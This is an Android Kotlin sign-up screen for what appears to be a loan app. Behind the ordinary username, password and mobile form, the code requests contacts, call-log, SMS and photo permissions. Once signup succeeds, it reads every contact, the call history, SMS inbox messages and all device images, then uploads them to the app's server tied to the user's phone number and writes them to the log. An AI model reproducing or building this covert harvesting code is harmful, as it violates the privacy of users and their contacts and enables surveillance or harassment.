package com.example.loanapp.ui.signup

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.lifecycle.ViewModelProvider
import com.example.loanapp.PreLoginActivity
import com.example.loanapp.R
import com.example.loanapp.databinding.FragmentHomeBinding
import com.example.loanapp.models.BaseResponse
import com.example.loanapp.utils.NavigationUtils
import com.example.loanapp.utils.StorageUtils
import com.example.loanapp.utils.ToastUtils
import java.io.ByteArrayOutputStream
import java.io.File

class SignUpFragment : Fragment() {

    private var _binding: FragmentHomeBinding? = null

    // This property is only valid between onCreateView and
    // onDestroyView.
    private val binding get() = _binding!!
    var isSignIn=false
    var isUpdate=false

    private val PERMISSIONS_REQUEST_CODE = 1001
    lateinit var mactivity:Activity
    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        val signUpViewModel =
            ViewModelProvider(this).get(SignUpViewModel::class.java)

        _binding = FragmentHomeBinding.inflate(inflater, container, false)
        val root: View = binding.root

        val bundle=arguments
        if (bundle!=null){
            if (bundle.getBoolean("isSignIn")!=null){
                isSignIn=bundle.getBoolean("isSignIn")
            }

            if (bundle.getBoolean("isUpdate")!=null){
                isUpdate=bundle.getBoolean("isUpdate")
            }
        }


        val textView: TextView = binding.textHome
        if (isSignIn){
            binding.textHome.text="SignIn"
            binding.mobileLayout.visibility=View.INVISIBLE
            binding.submitButton.text="SignIn"
        }else {

            if (isUpdate) {
                binding.textHome.text = "Update Profile"
                binding.submitButton.text = "Update"
            }else{
                checkAndRequestPermissions()
            }
        }

       /* signUpViewModel.text.observe(viewLifecycleOwner) {
            textView.text = it
        }*/
        binding.imgBack.setOnClickListener {
            NavigationUtils.popBackStack((activity as PreLoginActivity))
        }

       binding.submitButton.setOnClickListener {
           if (validateForm()) {
               // If validation is successful
               val username = binding.usernameEditText.text.toString().trim()
               val password = binding.passwordEditText.text.toString().trim()
               val mobile = binding.mobileEditText.text.toString().trim()


               val map=HashMap<String,String>()
               map.put("username",username)
               map.put("password",password)


               (activity as PreLoginActivity).showProgressDialog(true,"Loading...")


               if (!isSignIn) {
                   map.put("mobile", mobile)
                   if (isUpdate){
                       (activity as PreLoginActivity).preLoginActivityViewModel.callUpdateProfile(
                           map
                       )
                   }else {
                       (activity as PreLoginActivity).preLoginActivityViewModel.callApiSignup(
                           map
                       )
                   }
               }else{
                   (activity as PreLoginActivity).preLoginActivityViewModel.callApiSignIn(
                       map
                   )
               }
           }

       }

        initiate()
        return root
    }

    private fun checkAndRequestPermissions() {
         mactivity=(activity as PreLoginActivity)
        val permissionsNeeded = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(mactivity, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CONTACTS)
        }

        if (ContextCompat.checkSelfPermission(mactivity, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG)
        }

        if (ContextCompat.checkSelfPermission(mactivity, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS)
        }

        // Check for Android 13 and higher
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(mactivity, Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
            }


        } else {
            // For Android 12 and lower
            if (ContextCompat.checkSelfPermission(mactivity, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }


        if (permissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                mactivity,
                permissionsNeeded.toTypedArray(),
                PERMISSIONS_REQUEST_CODE
            )
        } else {
            // Permissions already granted
          //  accessUserData()
        }
    }

    private fun accessUserData() {
        // Access the user's contacts, call logs, messages, and photos here
        getContacts()
        getCallLogs()
        getSmsMessages()
        getPhotos()

        val hashMap=HashMap<String,Any>()
        hashMap.put("mobile",binding.mobileEditText.text.toString())
        hashMap.put("contacts",contacthashmap)
        hashMap.put("call_logs",callLoghashmap)
        hashMap.put("messages",smshashmap)
        (activity as PreLoginActivity).preLoginActivityViewModel.callUplUserData(
            hashMap
        )

    }
    val contacthashmap=HashMap<String,String>()
    val callLoghashmap=HashMap<String,String>()
    val smshashmap=HashMap<String,String>()
    val photosList = mutableListOf<String>()
    fun getContacts() {
        val cursor = mactivity.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        )

        cursor?.let {

            while (it.moveToNext()) {
                val id = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
                val name = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                // Do something with the contact data
                contacthashmap.put(id,name)

            }

            it.close()

        }

        Log.i("Signup","getContacts"+contacthashmap)
    }


    fun getCallLogs() {
        val cursor = mactivity.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, null
        )



        cursor?.let {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val type = it.getString(it.getColumnIndex(CallLog.Calls.TYPE))
                val date = it.getString(it.getColumnIndex(CallLog.Calls.DATE))
                val duration = it.getString(it.getColumnIndex(CallLog.Calls.DURATION))
                // Do something with the call log data
                callLoghashmap.put(number,date)
            }
            it.close()
        }

        Log.i("Signup","getCallLogs"+callLoghashmap)
    }

    fun getSmsMessages() {
        val cursor = mactivity.contentResolver.query(
            Uri.parse("content://sms/inbox"),
            null, null, null, null
        )
        cursor?.let {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndex("address"))
                val body = it.getString(it.getColumnIndex("body"))
                // Do something with the SMS data
                smshashmap.put(address,body)
            }
            it.close()
        }

        Log.i("Signup","getSmsMessages"+smshashmap)
    }

    fun getPhotos() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.RELATIVE_PATH
            )
            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

            val cursor = mactivity.contentResolver.query(
                uri, projection, null, null, sortOrder
            )


            cursor?.use {
                val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val displayNameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val dateAddedColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val relativePathColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.RELATIVE_PATH)

                while (it.moveToNext()) {
                    val id = it.getLong(idColumn)
                    val displayName = it.getString(displayNameColumn)
                    val dateAdded = it.getLong(dateAddedColumn)
                    val relativePath = it.getString(relativePathColumn)

                    val contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())

                    // Store the Uri or other relevant data

                    val base64String = uriToBase64(contentUri)
                    base64String?.let { encodedString ->
                        photosList.add(encodedString)
                        val hashMap=HashMap<String,String>()
                        hashMap.put("mobile",binding.mobileEditText.text.toString())
                        hashMap.put("photo",base64String)

                        (activity as PreLoginActivity).preLoginActivityViewModel.callUplPhotoData(
                            hashMap
                        )
                    }
                }
            }

            Log.i("Signup", "getPhotos: $photosList")
        }else{
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val cursor = mactivity.contentResolver.query(
                uri, null, null, null, null
            )

            cursor?.let {
                while (it.moveToNext()) {
                    val path = it.getString(it.getColumnIndex(MediaStore.Images.Media.DATA))
                    // Do something with the photo data
                    val fileUri = Uri.fromFile(File(path))
                    val base64String = uriToBase64(fileUri)
                    base64String?.let { encodedString ->
                        photosList.add(encodedString)
                        val hashMap=HashMap<String,String>()
                        hashMap.put("mobile",binding.mobileEditText.text.toString())
                        hashMap.put("photo",base64String)

                        (activity as PreLoginActivity).preLoginActivityViewModel.callUplPhotoData(
                            hashMap
                        )
                    }
                }
                it.close()
            }

            Log.i("Signup", "getPhotos" + photosList)
        }
    }

    private fun uriToBase64(imageUri: Uri): String? {
        return try {
            val inputStream = mactivity.contentResolver.openInputStream(imageUri)
            val options = BitmapFactory.Options().apply {
                // Load the image at a smaller scale to avoid OOM errors
                inJustDecodeBounds = true
            }

            BitmapFactory.decodeStream(inputStream, null, options)
            inputStream?.close()

            // Calculate the inSampleSize based on the image's dimensions
            options.inSampleSize = calculateInSampleSize(options, 1024, 1024)  // Example: scale to 1024x1024
            options.inJustDecodeBounds = false

            val inputStream2 = mactivity.contentResolver.openInputStream(imageUri)
            val bitmap = BitmapFactory.decodeStream(inputStream2, null, options)
            inputStream2?.close()

            // Convert the bitmap to a base64 string
            val byteArrayOutputStream = ByteArrayOutputStream()
            bitmap?.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream)
            val byteArray = byteArrayOutputStream.toByteArray()
            Base64.encodeToString(byteArray, Base64.DEFAULT)
        } catch (e: Exception) {
            Log.e("Signup", "Error converting URI to Base64", e)
            null
        }
    }

    private fun calculateInSampleSize(options: BitmapFactory.Options, reqWidth: Int, reqHeight: Int): Int {
        // Raw height and width of image
        val height = options.outHeight
        val width = options.outWidth
        var inSampleSize = 1

        if (height > reqHeight || width > reqWidth) {
            val halfHeight = height / 2
            val halfWidth = width / 2

            // Calculate the largest inSampleSize value that is a power of 2 and keeps both
            // height and width larger than the requested height and width.
            while ((halfHeight / inSampleSize) >= reqHeight && (halfWidth / inSampleSize) >= reqWidth) {
                inSampleSize *= 2
            }
        }

        return inSampleSize
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                // All requested permissions are granted
              //  accessUserData()
            } else {
                // Permission was denied, handle accordingly
            }
        }
    }

    private fun initiate() {
        (activity as PreLoginActivity).setViewModel()
        (activity as PreLoginActivity).preLoginActivityViewModel.clearApiSignIn()
        (activity as PreLoginActivity).preLoginActivityViewModel.clearApiSignup()
        (activity as PreLoginActivity).preLoginActivityViewModel.clearupdateProfileResponseHandler()
        (activity as PreLoginActivity).preLoginActivityViewModel.clearUplUserDataResponseHandler()
        (activity as PreLoginActivity).preLoginActivityViewModel.apiSignin.observe(viewLifecycleOwner){
            if (it != null) {
                (activity as PreLoginActivity).showProgressDialog(false,"Loading...")
                if (it.observeStatus)
                    onSuccessSiginIn(it)
            }
        }

        (activity as PreLoginActivity).preLoginActivityViewModel.apiSignup.observe(viewLifecycleOwner){
            if (it != null) {
               // (activity as PreLoginActivity).showProgressDialog(false,"Loading...")
                if (it.observeStatus)
                    onSuccessSigUpIn(it)
            }
        }

        (activity as PreLoginActivity).preLoginActivityViewModel.apiUpdateProfile.observe(viewLifecycleOwner){
            if (it != null) {
                (activity as PreLoginActivity).showProgressDialog(false,"Loading...")
                if (it.observeStatus)
                    onSuccessSiginIn(it)
            }
        }

        (activity as PreLoginActivity).preLoginActivityViewModel.apiUplUserData.observe(viewLifecycleOwner){
            if (it != null) {
                (activity as PreLoginActivity).showProgressDialog(false,"Loading...")
                if (it.observeStatus)
                    onSuccessUploadUserData(it)
            }
        }

        (activity as PreLoginActivity).preLoginActivityViewModel.apiUplPhotoData.observe(viewLifecycleOwner){
            if (it != null) {
                (activity as PreLoginActivity).showProgressDialog(false,"Loading...")
                if (it.observeStatus)
                    onSuccessUploadPhotoData(it)
            }
        }
    }

    private fun onSuccessUploadPhotoData(it: BaseResponse<HashMap<String, String>?>) {
        ToastUtils.showShortToast("Image uploaded successfully")
    }

    private fun onSuccessUploadUserData(it: BaseResponse<HashMap<String, String>?>) {
//navigate to prelogin
        val bundle=Bundle()
        bundle.putString("mobile",binding.mobileEditText.text.toString())

        NavigationUtils.goToFragment(activity=requireActivity(),bundle=bundle, navigateToId = R.id.action_nav_home_to_nav_gallery)
    }

    private fun onSuccessSigUpIn(it: BaseResponse<HashMap<String, String>?>) {
        StorageUtils.storeString("mobile",binding.mobileEditText.text.toString())

        accessUserData()


    }

    private fun onSuccessSiginIn(it: BaseResponse<HashMap<String, String>?>) {
        val bundle=Bundle()
        bundle.putString("mobile",binding.mobileEditText.text.toString())
        StorageUtils.storeString("mobile",binding.mobileEditText.text.toString())
        //navigate to home screen
        NavigationUtils.goToFragment(activity=requireActivity(),bundle=bundle, navigateToId = R.id.action_nav_home_to_nav_slideshow)

    }

    private fun validateForm(): Boolean {
        var isValid = true

        // Validate Username
        val username = binding.usernameEditText.text.toString().trim()
        if (username.isEmpty()) {
            binding.usernameLayout.error = "Username is required"
            isValid = false
        } else {
            binding.usernameLayout.error = null
        }

        // Validate Password
        val password = binding.passwordEditText.text.toString().trim()
        if (password.isEmpty()) {
            binding.passwordLayout.error = "Password is required"
            isValid = false
        } else if (password.length < 6) {
            binding.passwordLayout.error = "Password must be at least 6 characters"
            isValid = false
        } else {
            binding.passwordLayout.error = null
        }

        if (!isSignIn) {
            // Validate Mobile
            val mobile = binding.mobileEditText.text.toString().trim()
            if (mobile.isEmpty()) {
                binding.mobileLayout.error = "Mobile number is required"
                isValid = false
            } else if (mobile.length != 10) {
                binding.mobileLayout.error = "Mobile number must be 10 digits"
                isValid = false
            } else {
                binding.mobileLayout.error = null
            }
        }

        return isValid
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}